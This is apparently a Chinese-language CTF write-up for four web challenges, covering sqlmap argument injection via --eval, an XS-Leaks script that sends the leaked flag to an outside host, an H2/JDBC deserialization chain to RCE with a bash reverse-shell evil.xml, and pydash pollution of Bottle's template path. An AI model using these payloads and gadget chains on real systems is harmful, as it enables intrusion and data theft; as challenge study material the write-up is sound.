# Web

## sqlmap-master

签到题, 考虑到在平台靶机上跑一个 sqlmap 有亿点点危险, 所以设置成了不出网

```python
@app.post("/run")
async def run(request: Request):
    data = await request.json()
    url = data.get("url")
    
    if not url:
        return {"error": "URL is required"}
    
    command = f'sqlmap -u {url} --batch --flush-session'

    def generate():
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False
        )
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                yield output
    
    return StreamingResponse(generate(), media_type="text/plain")
```

很显然的 subprocess.Popen, 但因为设置了 `shell=False` 导致无法利用反引号等技巧进行常规的命令注入

但是仔细观察可以发现我们还是可以控制 sqlmap 的参数, 即**参数注入**

结合 GTFOBins: [https://gtfobins.github.io/gtfobins/sqlmap/](https://gtfobins.github.io/gtfobins/sqlmap/)

通过 `--eval` 参数可以执行 Python 代码, 然后因为上面 `command.split()` 默认是按空格分隔的, 所以需要一些小技巧来绕过

注意这里参数的值不需要加上单双引号, 因为上面已经设置了 `shell=False`, 如果加上去反而代表的是 "eval 一个 Python 字符串"

最终 payload

```python
127.0.0.1:8000 --eval __import__('os').system('env')
```

## internal_api

考点: 利用 HTTP Status Code 进行 XSLeaks

src/route.rs

```rust
pub async fn private_search(
    Query(search): Query<Search>,
    State(pool): State<Arc<DbPool>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> Result<Json<Vec<String>>, AppError> {
    // 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问

    // 本地环境 (docker compose)
    let bot_ip = tokio::net::lookup_host("bot:4444").await?.next().unwrap();
    if addr.ip() != bot_ip.ip() {
        return Err(anyhow!("only bot can access").into());
    }

    // 远程环境 (k8s)
    // if !addr.ip().is_loopback() {
    //     return Err(anyhow!("only bot can access").into());
    // }

    let conn = pool.get()?;
    let comments = db::search(conn, search.s, true)?;

    if comments.len() > 0 {
        Ok(Json(comments))
    } else {
        Err(anyhow!("No comments found").into())
    }
}
```

`/internal/search` 路由仅允许 bot 访问, 同时其 `db::search` 的第三个参数传入了 true, 代表允许搜索 hidden comments (flag)

如果能搜到 comments, 返回 `OK()` (200), 否则返回 `Err()` (500)

这是一个很经典的 XSLeaks 题目, 根据 [https://xsleaks.dev/](https://xsleaks.dev/), 结合以上不同的 HTTP 状态码, 可以利用 onload 和 onerror 事件 leak flag

payload

```html
<script>
    function probeError(flag) {
        let url = 'http://web:8000/internal/search?s=' + flag;

        let script = document.createElement('script');
        script.src = url;
        script.onload = () => {
            fetch('http://host.docker.internal:8001/?flag=' + flag, { mode: 'no-cors' });
            leak(flag);
            script.remove();
        };
        script.onerror = () => script.remove();
        document.head.appendChild(script);
    }

    let dicts = 'abcdefghijklmnopqrstuvwxyz0123456789-{}';

    function leak(flag) {
        for (let i = 0; i < dicts.length; i++) {
            let char = dicts[i];
            probeError(flag + char);
        }
    }

    leak('nctf{');
</script>
```

注意在打远程环境的时候要把 `http://web:8000/` 换成 `http://127.0.0.1:8000/` (题目描述已给提示)

## H2Revenge

考点: H2 数据库在 JRE 环境下的利用

出题思路源于去年研究的一个 RCE: [https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/](https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/)

题目是 Java 17 环境, 给了一个反序列化路由和 MyDataSource 类

```java
package challenge;

import javax.sql.DataSource;
import java.io.PrintWriter;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class MyDataSource implements DataSource, Serializable {
    private String url;
    private String username;
    private String password;

    public MyDataSource(String url, String username, String password) {
        this.url = url;
        this.username = username;
        this.password = password;
    }

    @Override
    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(url, username, password);
    }

    @Override
    public Connection getConnection(String username, String password) throws SQLException {
        return DriverManager.getConnection(url, username, password);
    }

    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return null;
    }

    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {

    }

    @Override
    public void setLoginTimeout(int seconds) throws SQLException {

    }

    @Override
    public int getLoginTimeout() throws SQLException {
        return 0;
    }

    @Override
    public <T> T unwrap(Class<T> iface) throws SQLException {
        return null;
    }

    @Override
    public boolean isWrapperFor(Class<?> iface) throws SQLException {
        return false;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }
}
```

结合 H2 依赖, 很明显是通过反序列化打 JDBC

前半部分的思路很简单, 通过 EventListenerList (readObject -> toString) + POJONode (toString -> 任意 Getter 调用) 触发 MyDataSource 的 getConnection 方法

后半部分需要用 JDBC 打 H2 RCE, 常规思路是利用 CREATE ALIAS 创建 Java 函数或者是利用 JavaScript 引擎 RCE

但这里的坑点在于:

1. Java 17 版本中 JavaScript 引擎 (Nashorn) 已经被删除
2. 题目给的是 JRE 17 而不是 JDK 17, 不存在 javac 命令, 无法编译 Java 代码, 也就是说无法像常规思路那样通过 CREATE ALIAS 创建 Java 函数

翻阅 H2 数据库文档可知, CREATE ALIAS 除了创建 Java 函数外, 还能够直接引用已知的 Java 静态方法, 这个过程不需要 javac 命令

[https://h2database.com/html/features.html](https://h2database.com/html/features.html)

[https://h2database.com/html/datatypes.html](https://h2database.com/html/datatypes.html)

[https://h2database.com/html/grammar.html](https://h2database.com/html/grammar.html)

![image-20240304153655560](https://img.exp10it.io/2024/03/202403041536617.png)

那么就可以尝试结合第三方依赖使用一些特定的静态方法完成 RCE

理论上会有很多种利用思路, 我的思路是利用 Spring 的 ReflectUtils 反射调用 ClassPathXmlApplicationContext 的构造方法

```sql
CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';

SET @url_str='http://host.docker.internal:8000/evil.xml';
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_str]);
```

不过这里存在一个问题, 如果直接这样执行 SQL 语句的话会报错

```sql
Caused by: org.h2.jdbc.JdbcSQLDataException: Data conversion error converting "CHARACTER VARYING to JAVA_OBJECT"; SQL statement:

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_str]) [22018-232]
```

这是由于 H2 不支持 `JAVA_OBJECT` 与 VARCHAR (CHARACTER VARYING) 类型之间的转换

[https://github.com/h2database/h2database/issues/3389](https://github.com/h2database/h2database/issues/3389)

上面的 `@url_str` 属于 VARCHAR 类型, 而 ReflectUtils.newInstance 传入的参数 args 属于 Object 类型

![image-20250323113345506](https://img.exp10it.io/2025/03/34861210e0f81b77.png)

解决办法是找一个参数是 Object 类型并且返回值是 String 类型的静态方法, 间接实现类型的转换, 可以使用 CodeQL/Tabby 或者手工查找

```sql
import java

from Method m
where
  m.isPublic() and
  m.isStatic() and
  m.getNumberOfParameters() = 1 and
  m.getAParameter().getType() instanceof TypeString and
  m.getReturnType() instanceof TypeObject
select m
```

我选择的是 `javax.naming.ldap.Rdn.unescapeValue` 方法

```java
public static Object unescapeValue(String val) {

    char[] chars = val.toCharArray();
    int beg = 0;
    int end = chars.length;

    // Trim off leading and trailing whitespace.
    while ((beg < end) && isWhitespace(chars[beg])) {
        ++beg;
    }

    while ((beg < end) && isWhitespace(chars[end - 1])) {
        --end;
    }

    // Add back the trailing whitespace with a preceding '\'
    // (escaped or unescaped) that was taken off in the above
    // loop. Whether or not to retain this whitespace is decided below.
    if (end != chars.length &&
            (beg < end) &&
            chars[end - 1] == '\\') {
        end++;
    }
    if (beg >= end) {
        return "";
    }

    if (chars[beg] == '#') {
        // Value is binary (eg: "#CEB1DF80").
        return decodeHexPairs(chars, ++beg, end);
    }

    // Trim off quotes.
    if ((chars[beg] == '\"') && (chars[end - 1] == '\"')) {
        ++beg;
        --end;
    }

    StringBuilder builder = new StringBuilder(end - beg);
    int esc = -1; // index of the last escaped character

    for (int i = beg; i < end; i++) {
        if ((chars[i] == '\\') && (i + 1 < end)) {
            if (!Character.isLetterOrDigit(chars[i + 1])) {
                ++i;                            // skip backslash
                builder.append(chars[i]);       // snarf escaped char
                esc = i;
            } else {

                // Convert hex-encoded UTF-8 to 16-bit chars.
                byte[] utf8 = getUtf8Octets(chars, i, end);
                if (utf8.length > 0) {
                    try {
                        builder.append(new String(utf8, "UTF8"));
                    } catch (java.io.UnsupportedEncodingException e) {
                        // shouldn't happen
                    }
                    i += utf8.length * 3 - 1;
                } else { // no utf8 bytes available, invalid DN

                    // '/' has no meaning, throw exception
                    throw new IllegalArgumentException(
                        "Not a valid attribute string value:" +
                        val + ",improper usage of backslash");
                }
            }
        } else {
            builder.append(chars[i]);   // snarf unescaped char
        }
    }

    // Get rid of the unescaped trailing whitespace with the
    // preceding '\' character that was previously added back.
    int len = builder.length();
    if (isWhitespace(builder.charAt(len - 1)) && esc != (end - 1)) {
        builder.setLength(len - 1);
    }
    return builder.toString();
}
```

最终 payload

```sql
CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';

SET @url_str='http://host.docker.internal:8000/evil.xml';
SET @url_obj=UNESCAPE_VALUE(@url_str);
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);
```

evil.xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value><![CDATA[bash -i >& /dev/tcp/host.docker.internal/4444 0>&1]]></value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

反序列化 payload

```java
package exploit;

import challenge.MyDataSource;
import com.fasterxml.jackson.databind.node.POJONode;

import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.util.Base64;
import java.util.Vector;

public class Main {
    public static void main(String[] args) throws Exception {
        UnsafeUtil.patchModule(Main.class);
        UnsafeUtil.patchModule(ReflectUtil.class);

        MyDataSource dataSource = new MyDataSource("jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/wrong.sql'", "aaa", "bbb");
        POJONode pojoNode = new POJONode(dataSource);

        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) ReflectUtil.getFieldValue(CompoundEdit.class, undoManager, "edits");
        vector.add(pojoNode);
        ReflectUtil.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});

        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(eventListenerList)));
        SerializeUtil.test(eventListenerList);
    }
}
```

UnsafeUtil

```java
package exploit;

import sun.misc.Unsafe;

import java.lang.reflect.Field;

public class UnsafeUtil {
    private static final Unsafe unsafe;

    static {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field theUnsafeField = unsafeClass.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            unsafe = (Unsafe) theUnsafeField.get(null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void patchModule(Class clazz) throws Exception {
        Module baseModule = Object.class.getModule();
        setFieldValue(clazz, "module", baseModule);
    }

    public static Object getFieldValue(Object obj, String name) throws Exception {
        return getFieldValue(obj.getClass(), obj, name);
    }

    public static Object getFieldValue(Class<?> clazz, Object obj, String name) throws Exception {
        Field f = clazz.getDeclaredField(name);
        long offset;

        if (obj == null) {
            offset = unsafe.staticFieldOffset(f);
        } else {
            offset = unsafe.objectFieldOffset(f);
        }

        return unsafe.getObject(obj, offset);
    }

    public static void setFieldValue(Object obj, String name, Object val) throws Exception {
        setFieldValue(obj.getClass(), obj, name, val);
    }

    public static void setFieldValue(Class<?> clazz, Object obj, String name, Object val) throws Exception {
        Field f = clazz.getDeclaredField(name);
        long offset;

        if (obj == null) {
            offset = unsafe.staticFieldOffset(f);
        } else {
            offset = unsafe.objectFieldOffset(f);
        }

        unsafe.putObject(obj, offset, val);
    }

    public static Object newInstance(Class<?> clazz) throws Exception {
        return unsafe.allocateInstance(clazz);
    }
}
```

ReflectUtil

```java
package exploit;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ReflectUtil {

    public static Object getFieldValue(Object obj, String name) throws Exception {
        return getFieldValue(obj.getClass(), obj, name);
    }

    public static Object getFieldValue(Class<?> clazz, Object obj, String name) throws Exception {
        Field f = clazz.getDeclaredField(name);
        f.setAccessible(true);
        return f.get(obj);
    }

    public static void setFieldValue(Object obj, String name, Object val) throws Exception {
        setFieldValue(obj.getClass(), obj, name, val);
    }

    public static void setFieldValue(Class<?> clazz, Object obj, String name, Object val) throws Exception {
        Field f = clazz.getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }

    public static Object invokeMethod(Object obj, String name, Class[] parameterTypes, Object[] args) throws Exception {
        return invokeMethod(obj.getClass(), obj, name, parameterTypes, args);
    }

    public static Object invokeMethod(Class<?> clazz, Object obj, String name, Class[] parameterTypes, Object[] args) throws Exception {
        Method m = obj.getClass().getDeclaredMethod(name, parameterTypes);
        m.setAccessible(true);
        return m.invoke(obj, args);
    }

    public static Object newInstance(Class<?> clazz, Class[] parameterTypes, Object[] args) throws Exception {
        Constructor constructor = clazz.getDeclaredConstructor(parameterTypes);
        constructor.setAccessible(true);
        return constructor.newInstance(args);
    }
}
```

SerializeUtil

```java
package exploit;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class SerializeUtil {

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream arr = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(arr)){
            output.writeObject(obj);
        }
        return arr.toByteArray();
    }

    public static Object deserialize(byte[] arr) throws Exception {
        try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(arr))){
            return input.readObject();
        }
    }

    public static void test(Object obj) throws Exception {
        deserialize(serialize(obj));
    }
}
```
## ez_dash & ez_dash_revenge
> 预期解是污染掉bottle.TEMPLATE_PATH实现任意文件读取，没想到可以<%%>直接rce sorry
```
@bottle.post('/setValue')
def set_value():
    name = bottle.request.query.get('name')
    path=bottle.request.json.get('path')
    if not isinstance(path,str):
        return "no"
    if len(name)>6 or len(path)>32:
        return "no"
    value=bottle.request.json.get('value')
    return "yes" if setval(name, path, value) else "no"

@bottle.get('/render')
def render_template():
    path=bottle.request.query.get('path')
    if len(path)>10:
        return "hacker"
    blacklist=["{","}",".","%","<",">","_"] 
    for c in path:
        if c in blacklist:
            return "hacker"
    return bottle.template(path)
```
首先就是这两个路由，理想状态下render路由只能渲染文件，而不是传入的字符串。但是我们看到
```
@classmethod
def search(cls, name, lookup=None):
    """ Search name in all directories specified in lookup.
    First without, then with common extensions. Return first hit. """
    if not lookup:
        raise depr(0, 12, "Empty template lookup path.", "Configure a template lookup path.")

    if os.path.isabs(name):
        raise depr(0, 12, "Use of absolute path for template name.",
                   "Refer to templates with names or paths relative to the lookup path.")

    for spath in lookup:
        spath = os.path.abspath(spath) + os.sep
        fname = os.path.abspath(os.path.join(spath, name))
        if not fname.startswith(spath): continue
        if os.path.isfile(fname): return fname
        for ext in cls.extensions:
            if os.path.isfile('%s.%s' % (fname, ext)):
                return '%s.%s' % (fname, ext)
```
最终找到BaseTemplate的search方法，可以看到是没办法使用../../来逃逸的，所以需要想办法去修改TEMPLATE_PATH，然后去实现任意文件读取，接下来去看setval函数
```
def setval(name:str, path:str, value:str)-> Optional[bool]:
    if name.find("__")>=0: return False
    for word in __forbidden_name__:
        if name==word:
            return False
    for word in __forbidden_path__:
        if path.find(word)>=0: return False
    obj=globals()[name]
    try:
        pydash.set_(obj,path,value)
    except:
        return False
    return True
```
结合黑名单和限制大致的利用就是
```
setval.__globals__.bottle.TEMPLATE=['../../../../../proc/self/']
```
但是pydash是不允许去修改__globals__属性的，去看一下代码
```
def base_set(obj, key, value, allow_override=True):
    """
    Set an object's `key` to `value`. If `obj` is a ``list`` and the `key` is the next available
    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.

    Args:
        obj: Object to assign value to.
        key: Key or index to assign to.
        value: Value to assign.
        allow_override: Whether to allow overriding a previously set key.
    """
    if isinstance(obj, dict):
        if allow_override or key not in obj:
            obj[key] = value
    elif isinstance(obj, list):
        key = int(key)

        if key < len(obj):
            if allow_override:
                obj[key] = value
        else:
            if key > len(obj):
                # Pad list object with None values up to the index key, so we can append the value
                # into the key index.
                obj[:] = (obj + [None] * key)[:key]
            obj.append(value)
    elif (allow_override or not hasattr(obj, key)) and obj is not None:
        _raise_if_restricted_key(key)
        setattr(obj, key, value)

    return obj
def _raise_if_restricted_key(key):
    # Prevent access to restricted keys for security reasons.
    if key in RESTRICTED_KEYS:
        raise KeyError(f"access to restricted key {key!r} is not allowed")
```
所以可以先利用这个setval将RESTRICTED_KEYS修改
![image](https://github.com/user-attachments/assets/f365f8d0-4421-4732-a965-836044115b03)

然后再去修改
![image](https://github.com/user-attachments/assets/8ff833d7-4617-4999-9167-b603a74fcc75)
![image](https://github.com/user-attachments/assets/4c5a0a79-ca9e-4d66-811f-4dbd22f2ebdf)



